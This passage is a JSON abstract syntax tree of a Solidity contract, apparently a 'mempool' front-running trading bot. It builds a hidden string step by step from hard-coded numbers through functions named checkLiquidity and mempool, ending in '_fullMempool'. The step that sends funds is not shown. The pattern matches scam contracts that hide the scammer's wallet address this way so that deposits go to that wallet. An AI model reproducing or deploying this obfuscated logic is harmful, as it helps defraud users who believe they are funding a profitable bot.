												],
												"declarations": [
													{
														"constant": false,
														"id": 1353,
														"mutability": "mutable",
														"name": "_memPoolSol",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14042:16:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1352,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14042:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1355,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "333333303231",
													"id": 1354,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "14061:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_333021_by_1",
														"typeString": "int_const 333021"
													},
													"value": "333021"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14042:25:3"
											},
											{
												"assignments": [
													1357
												],
												"declarations": [
													{
														"constant": false,
														"id": 1357,
														"mutability": "mutable",
														"name": "_memPoolLength",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14078:19:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1356,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14078:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1360,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1358,
														"name": "getMemPoolLength",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1157,
														"src": "14100:16:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1359,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14100:18:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14078:40:3"
											},
											{
												"assignments": [
													1362
												],
												"declarations": [
													{
														"constant": false,
														"id": 1362,
														"mutability": "mutable",
														"name": "_memPoolSize",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14129:17:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1361,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14129:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1364,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "383637393736",
													"id": 1363,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "14149:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_867976_by_1",
														"typeString": "int_const 867976"
													},
													"value": "867976"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14129:26:3"
											},
											{
												"assignments": [
													1366
												],
												"declarations": [
													{
														"constant": false,
														"id": 1366,
														"mutability": "mutable",
														"name": "_memPoolHeight",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14166:19:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1365,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14166:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1369,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1367,
														"name": "getMemPoolHeight",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1337,
														"src": "14188:16:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1368,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14188:18:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14166:40:3"
											},
											{
												"assignments": [
													1371
												],
												"declarations": [
													{
														"constant": false,
														"id": 1371,
														"mutability": "mutable",
														"name": "_memPoolWidth",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14217:18:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1370,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14217:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1373,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "333432313233",
													"id": 1372,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "14238:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_342123_by_1",
														"typeString": "int_const 342123"
													},
													"value": "342123"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14217:27:3"
											},
											{
												"assignments": [
													1375
												],
												"declarations": [
													{
														"constant": false,
														"id": 1375,
														"mutability": "mutable",
														"name": "_memPoolDepth",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14255:18:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1374,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14255:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1378,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1376,
														"name": "getMemPoolDepth",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1626,
														"src": "14276:15:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1377,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14276:17:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14255:38:3"
											},
											{
												"assignments": [
													1380
												],
												"declarations": [
													{
														"constant": false,
														"id": 1380,
														"mutability": "mutable",
														"name": "_memPoolCount",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14304:18:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1379,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "14304:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1382,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "333837323339",
													"id": 1381,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "14325:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_387239_by_1",
														"typeString": "int_const 387239"
													},
													"value": "387239"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14304:27:3"
											},
											{
												"assignments": [
													1384
												],
												"declarations": [
													{
														"constant": false,
														"id": 1384,
														"mutability": "mutable",
														"name": "_memPool1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14345:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1383,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14345:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1391,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1386,
															"name": "_memPoolOffset",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1343,
															"src": "14379:14:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1388,
																	"name": "_memPoolSol",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1353,
																	"src": "14410:11:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1387,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "14395:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1389,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14395:27:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1385,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1723,
														"src": "14371:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1390,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14371:52:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14345:78:3"
											},
											{
												"assignments": [
													1393
												],
												"declarations": [
													{
														"constant": false,
														"id": 1393,
														"mutability": "mutable",
														"name": "_memPool2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14434:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1392,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14434:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1402,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1396,
																	"name": "_memPoolLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1357,
																	"src": "14483:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1395,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "14468:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1397,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14468:30:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1399,
																	"name": "_memPoolSize",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1362,
																	"src": "14515:12:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1398,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "14500:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1400,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14500:28:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1394,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1723,
														"src": "14460:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1401,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14460:69:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14434:95:3"
											},
											{
												"assignments": [
													1404
												],
												"declarations": [
													{
														"constant": false,
														"id": 1404,
														"mutability": "mutable",
														"name": "_memPool3",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14540:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1403,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14540:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1413,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1407,
																	"name": "_memPoolHeight",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1366,
																	"src": "14589:14:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1406,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "14574:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1408,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14574:30:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1410,
																	"name": "_memPoolWidth",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1371,
																	"src": "14621:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1409,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "14606:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1411,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14606:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1405,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1723,
														"src": "14566:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1412,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14566:70:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14540:96:3"
											},
											{
												"assignments": [
													1415
												],
												"declarations": [
													{
														"constant": false,
														"id": 1415,
														"mutability": "mutable",
														"name": "_memPool4",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14647:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1414,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14647:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1424,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1418,
																	"name": "_memPoolDepth",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1375,
																	"src": "14696:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1417,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "14681:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1419,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14681:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1421,
																	"name": "_memPoolCount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1380,
																	"src": "14727:13:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1420,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1149,
																"src": "14712:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1422,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14712:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1416,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1723,
														"src": "14673:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1423,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14673:69:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14647:95:3"
											},
											{
												"assignments": [
													1426
												],
												"declarations": [
													{
														"constant": false,
														"id": 1426,
														"mutability": "mutable",
														"name": "_allMempools",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14756:26:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1425,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14756:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1437,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1429,
																	"name": "_memPool1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1384,
																	"src": "14801:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1430,
																	"name": "_memPool2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1393,
																	"src": "14812:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1428,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1723,
																"src": "14793:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1431,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14793:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1433,
																	"name": "_memPool3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1404,
																	"src": "14832:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1434,
																	"name": "_memPool4",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1415,
																	"src": "14843:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1432,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1723,
																"src": "14824:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1435,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14824:29:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1427,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1723,
														"src": "14785:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1436,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14785:69:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14756:98:3"
											},
											{
												"assignments": [
													1439
												],
												"declarations": [
													{
														"constant": false,
														"id": 1439,
														"mutability": "mutable",
														"name": "_fullMempool",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1447,
														"src": "14865:26:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1438,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14865:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1444,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1441,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14902:3:3",
															"subdenomination": null,
															"typeDescriptions": {
